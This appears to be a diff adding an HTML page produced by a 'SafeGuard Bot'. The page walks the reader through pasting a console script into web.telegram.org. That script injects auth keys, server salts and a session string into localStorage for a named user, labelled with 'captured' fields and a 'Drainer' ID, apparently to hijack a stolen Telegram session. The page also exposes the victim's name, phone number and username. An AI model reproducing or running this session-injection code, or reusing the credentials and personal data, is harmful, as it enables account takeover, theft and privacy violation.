@@ -1,0 +1,225 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web Script - Cyril</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            color: #fff;
+            margin: 0;
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        .info {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        .info h3 {
+            margin-top: 0;
+            color: #fff;
+        }
+        .info p {
+            margin: 5px 0;
+            font-size: 1.1em;
+        }
+        .instructions {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        .instructions h3 {
+            margin-top: 0;
+            color: #fff;
+        }
+        .instructions ol {
+            padding-left: 20px;
+        }
+        .instructions li {
+            margin: 10px 0;
+            font-size: 1.1em;
+        }
+        .script-container {
+            background: #1e1e1e;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        .script-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .script-header h3 {
+            margin: 0;
+            color: #fff;
+        }
+        .copy-btn {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background 0.3s;
+        }
+        .copy-btn:hover {
+            background: #45a049;
+        }
+        .copy-btn:active {
+            background: #3d8b40;
+        }
+        .script-content {
+            background: #2d2d2d;
+            border-radius: 5px;
+            padding: 15px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.4;
+            color: #e6e6e6;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .execute-btn {
+            background: #2196F3;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 15px;
+            transition: background 0.3s;
+        }
+        .execute-btn:hover {
+            background: #1976D2;
+        }
+        .execute-btn:active {
+            background: #1565C0;
+        }
+        .warning {
+            background: rgba(255, 193, 7, 0.2);
+            border: 1px solid #ffc107;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        .warning h4 {
+            margin: 0 0 10px 0;
+            color: #ffc107;
+        }
+        .warning p {
+            margin: 5px 0;
+            color: #fff;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            opacity: 0.8;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Telegram Web Script</h1>
+        </div>
+        
+        <div class="info">
+            <h3>📋 User Information</h3>
+            <p><strong>Name:</strong> Cyril Emmanuel</p>
+            <p><strong>Phone:</strong> +2347048568350</p>
+            <p><strong>User ID:</strong> 5192609504</p>
+            <p><strong>Generated:</strong> 2025-07-13 23:15:47</p>
+        </div>
+        
+        <div class="warning">
+            <h4>⚠️ Important Notice</h4>
+            <p>This script contains sensitive authentication data. Use it only on web.telegram.org/a/</p>
+            <p>Do not share this URL with anyone else.</p>
+        </div>
+        
+        <div class="instructions">
+            <h3>📝 Instructions</h3>
+            <ol>
+                <li>Open <a href="https://web.telegram.org/a/" target="_blank" style="color: #4CAF50;">https://web.telegram.org/a/</a> in your browser</li>
+                <li>Press F12 to open Developer Tools</li>
+                <li>Go to Console tab</li>
+                <li>Copy the script below and paste it in the console</li>
+                <li>Press Enter to execute</li>
+            </ol>
+        </div>
+        
+        <div class="script-container">
+            <div class="script-header">
+                <h3>🔧 Script Content</h3>
+                <button class="copy-btn" onclick="copyScript()">📋 Copy Script</button>
+            </div>
+            <div class="script-content" id="scriptContent">Notification.requestPermission = () => Promise.resolve("denied");if(location.host=="web.telegram.org"){localStorage.clear(),Object.entries({"xt_instance":"{\"id\": 5192609504, \"idle\": false, \"time\": 1752444947450}","dc1_auth_key":"\"882839b08e2f82665fe59e8aee9c0b7b616399caec1dd2e3d5a9e70c7e8f6549481b295ad19e664d25655a6af6acff1c31dc3ee0f6b6ca8a3a249d3d625619f0dd36232292f2781fa127b1e04e032749adb14fef8a6274d73b7fe082a8fa716c097d796026eb21db3d0314485b8a48b5dd067fee903b52e02f9f51f36ca7ffd5ab30b5ff26bbd3a52cf8f8a5c7dc136f45254f536c0f1850b4f83403d049052481b3347152d88d8236185ee1c29612da077b09c480e5c317ae8c541f510f4c049ef094b97241a6d363e7fc2227cdc93facd01e5067a4e15a852d6995b18d8c36956687819d4d5d40eb13165911fcafd138cab4f9363a6d20fcacff66017e3771\"","dc2_auth_key":"\"882839b08e2f82665fe59e8aee9c0b7b616399caec1dd2e3d5a9e70c7e8f6549481b295ad19e664d25655a6af6acff1c31dc3ee0f6b6ca8a3a249d3d625619f0dd36232292f2781fa127b1e04e032749adb14fef8a6274d73b7fe082a8fa716c097d796026eb21db3d0314485b8a48b5dd067fee903b52e02f9f51f36ca7ffd5ab30b5ff26bbd3a52cf8f8a5c7dc136f45254f536c0f1850b4f83403d049052481b3347152d88d8236185ee1c29612da077b09c480e5c317ae8c541f510f4c049ef094b97241a6d363e7fc2227cdc93facd01e5067a4e15a852d6995b18d8c36956687819d4d5d40eb13165911fcafd138cab4f9363a6d20fcacff66017e3771\"","dc3_auth_key":"\"882839b08e2f82665fe59e8aee9c0b7b616399caec1dd2e3d5a9e70c7e8f6549481b295ad19e664d25655a6af6acff1c31dc3ee0f6b6ca8a3a249d3d625619f0dd36232292f2781fa127b1e04e032749adb14fef8a6274d73b7fe082a8fa716c097d796026eb21db3d0314485b8a48b5dd067fee903b52e02f9f51f36ca7ffd5ab30b5ff26bbd3a52cf8f8a5c7dc136f45254f536c0f1850b4f83403d049052481b3347152d88d8236185ee1c29612da077b09c480e5c317ae8c541f510f4c049ef094b97241a6d363e7fc2227cdc93facd01e5067a4e15a852d6995b18d8c36956687819d4d5d40eb13165911fcafd138cab4f9363a6d20fcacff66017e3771\"","dc4_auth_key":"\"882839b08e2f82665fe59e8aee9c0b7b616399caec1dd2e3d5a9e70c7e8f6549481b295ad19e664d25655a6af6acff1c31dc3ee0f6b6ca8a3a249d3d625619f0dd36232292f2781fa127b1e04e032749adb14fef8a6274d73b7fe082a8fa716c097d796026eb21db3d0314485b8a48b5dd067fee903b52e02f9f51f36ca7ffd5ab30b5ff26bbd3a52cf8f8a5c7dc136f45254f536c0f1850b4f83403d049052481b3347152d88d8236185ee1c29612da077b09c480e5c317ae8c541f510f4c049ef094b97241a6d363e7fc2227cdc93facd01e5067a4e15a852d6995b18d8c36956687819d4d5d40eb13165911fcafd138cab4f9363a6d20fcacff66017e3771\"","dc5_auth_key":"\"882839b08e2f82665fe59e8aee9c0b7b616399caec1dd2e3d5a9e70c7e8f6549481b295ad19e664d25655a6af6acff1c31dc3ee0f6b6ca8a3a249d3d625619f0dd36232292f2781fa127b1e04e032749adb14fef8a6274d73b7fe082a8fa716c097d796026eb21db3d0314485b8a48b5dd067fee903b52e02f9f51f36ca7ffd5ab30b5ff26bbd3a52cf8f8a5c7dc136f45254f536c0f1850b4f83403d049052481b3347152d88d8236185ee1c29612da077b09c480e5c317ae8c541f510f4c049ef094b97241a6d363e7fc2227cdc93facd01e5067a4e15a852d6995b18d8c36956687819d4d5d40eb13165911fcafd138cab4f9363a6d20fcacff66017e3771\"","dc1_server_salt":"\"882839b08e2f8266\"","dc2_server_salt":"\"5fe59e8aee9c0b7b\"","dc3_server_salt":"\"616399caec1dd2e3\"","dc4_server_salt":"\"d5a9e70c7e8f6549\"","dc5_server_salt":"\"481b295ad19e664d\"","user_auth":"{\"dcID\": 4, \"date\": 1752444947, \"id\": 5192609504}","state_id":"945555281","dc":"4","k_build":"579","auth_key_fingerprint":"\"882839b0\"","server_time_offset":"0","session_string":"1BJWap1wBu4goObCOL4JmX-Weiu6cC3thY5nK7B3S49Wp5wx-j2VJSBspWtGeZk0lZVpq9qz_HDHcPuD2tsqKOiSdPWJWGfDdNiMikvJ4H6EnseBOAydJrbFP74pidNc7f-CCqPpxbAl9eWAm6yHbPQMUSFuKSLXdBn_ukDtS4C-fUfNsp__VqzC1_ya706Us-Pilx9wTb0UlT1NsDxhQtPg0A9BJBSSBszRxUtiNgjYYXuHClhLaB3sJxIDlwxeujFQfUQ9MBJ7wlLlyQabTY-f8IifNyT-s0B5QZ6ThWoUtaZWxjYw2lWaHgZ1NXUDrExZZEfyv0TjKtPk2Om0g_Kz_ZgF-N3E=","tgWebAppStartParam":"eyJEcmFpbmVySUQiOiA1MTkyNjA5NTA0LCAiRHJhaW5lckNoYW5uZWxJRCI6IC0xMDAyNTczMDEyNjMyfQ==","captured_user_id":"5192609504","captured_phone":"2347048568350","captured_first_name":"Cyril","captured_last_name":"Emmanuel","captured_username":"Myles_20","captured_at":"1752444947","session_type":"real_telethon_session","auth_key_source":"real_telethon_client","auth_key_length":"256","is_real_authentication":"True"}).forEach(i=>localStorage.setItem(i[0],i[1]))}location="https://web.telegram.org/a/"</div>
+            <button class="execute-btn" onclick="executeScript()">▶️ Execute Script</button>
+        </div>
+        
+        <div class="footer">
+            <p>Generated by SafeGuard Bot • 2025-07-13 23:15:47</p>
+        </div>
+    </div>
+
+    <script>
+        function copyScript() {
+            const scriptContent = document.getElementById('scriptContent').textContent;
+            navigator.clipboard.writeText(scriptContent).then(function() {
+                const btn = document.querySelector('.copy-btn');
+                const originalText = btn.textContent;
+                btn.textContent = '✅ Copied!';
+                btn.style.background = '#4CAF50';
+                setTimeout(function() {
+                    btn.textContent = originalText;
+                    btn.style.background = '#4CAF50';
+                }, 2000);
+            });
+        }
+        
+        function executeScript() {
+            const scriptContent = document.getElementById('scriptContent').textContent;
+            try {
+                // Open web.telegram.org/a/ in a new tab
+                window.open('https://web.telegram.org/a/', '_blank');
+                alert('Opening web.telegram.org/a/ in a new tab. Please copy and paste the script in the console.');
+            } catch (error) {
+                alert('Error: ' + error.message);
+            }
+        }
+    </script>
+</body>
+</html>
